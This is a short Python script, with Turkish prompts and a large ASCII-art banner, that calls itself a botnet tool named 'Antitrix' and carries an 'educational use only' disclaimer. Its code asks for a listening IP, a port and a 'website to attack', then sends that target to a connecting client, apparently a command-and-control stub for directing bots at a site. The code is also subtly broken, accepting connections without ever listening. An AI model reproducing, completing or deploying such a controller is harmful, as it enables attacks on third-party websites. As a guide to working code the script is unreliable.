import requests
import socket
import time
from colorama import init
from termcolor import colored
init()
print('bu yazilim ovsky ailesinden Ömovsky tarafindan kodlanmiş bir botnet aracidir')
print('bu yazilim eğitim için kodlanmistir herhangi bir illegal kullanimdan ben sorumlu değilimdir')
print(colored("""\

   ___   _   _  _____  _____  _____ ______  _____ __   __
 / _ \ | \ | ||_   _||_   _||_   _|| ___ \|_   _|\ \ / /
/ /_\ \|  \| |  | |    | |    | |  | |_/ /  | |   \ V / 
|  _  || . ` |  | |    | |    | |  |    /   | |   /   \  
| | | || |\  |  | |   _| |_   | |  | |\ \  _| |_ / /^\ 
\_| |_/\_| \_/  \_/   \___/   \_/  \_| \_| \___/ \/   \/

                      .7JYYY?^                              
                     :5Y5PYGGGJ.                            
                     .GP5555P555:                           
                      ~PPJ7?JYY5P:                          
                       .!YY!!J5PP5:                         
                          ^J5?JYY5P???7!~:.         ^?JJ?!: 
                          ~?G5JY55BGGGGGGPG7 :7^.  YPPY55Y5^
                         7GPGGPPPGBGBBBGGG#?^PGG57?PJY5PPPB!
                       ^?PP55555555555PGBBGGGBPPPGB7~JYPPPP^
                     !YP55Y555PPPPP55YYY55GBGGBGPB5!?YYY5Y: 
                   .JP5Y555PGBBBBBBBBGP5Y5YPBBGBB57Y555P7.  
                  .555Y555JJY5PGGGBBBB#BPY5JPGBY5YJYY5GG:   
                 ~G55JP55JJJJJJJY5PGGGBB#5Y5JGGG5GPPGBGBP.  
   ....        .JB#J5?5PJJJJJJJ?JJJJY5PGBGJP?PGBBGBBB#GGBJ  
 ^JYYPY5?!:   .P#B#J5?PPJJJYYYYYJJJJJJJJP5J5?GGBGGBBBB#GB5  
^PYPJGJ5??JJ7~!#BPBP?5YPGGGGGGPGYJJJJJ?J5J5?YGGBGBBBBB##J:  
:5PPPYYP??7775YPGYJB5?YYPBBBBGGGGYJJJJY5Y5JJGGBBBBBBBBB#:   
 .JPGPPYYYJJY5?J5J?JBPJJY5PGBBBBGGYY55YYJJ5GGBBBBBBBBB#G.   
   .:~7JYYPGPYYY5PGPPPG5YJJJYY5555YYYJJJ5GGGBBBB##B###5:    
         ~PGGGGGGGGPP5PBBGP5YYYYYYYY55PGGBBBBB#B#BBPJ^      
       .JBBGGBBBBBBBBB#GY75BGGGGGGGGBBBBGGB#B#BB#~:         
      ~G#BGGBBB#G?77?J?^ 7#GGPPB5Y55GBGBBBBBBBB#Y           
     ~BBGGBBBBP?:        ^5GBBBBY7YYPBGGB#BBB#B7            
     J#BB#GY?^.            :7PBG5YPPPBGGB#BB#P:             
     ^PY7^.                  ~G5YJJY5PBGG###?.              
                             :GPJ55YJGBGBPY~                
                              ~YPP5PGBGB~                   
                               :GBG#GGB!                    
                              ^G#GGBGB7                     
                             !BBBGB#G~                      
                           .J#BBGBBJ:                       
                          ^P#BBGPJ^                         
                         .?Y?7!^.  
                   
                    
                     
                      
                       
                        
                          """,'red'))
print('Antitrix başlatiliyor...')
time.sleep(10)
ipadresi= str(input('dinleme yapilacak ip:' ))
port= int(input('dinlenicek port'))
saldirilacaksite= input('saldirilacak web sitesi')
soket= socket.socket()
soket.bind((ipadresi,port))
conn, addr= soket.accept()
conn.sendall(saldirilacaksite.encode())
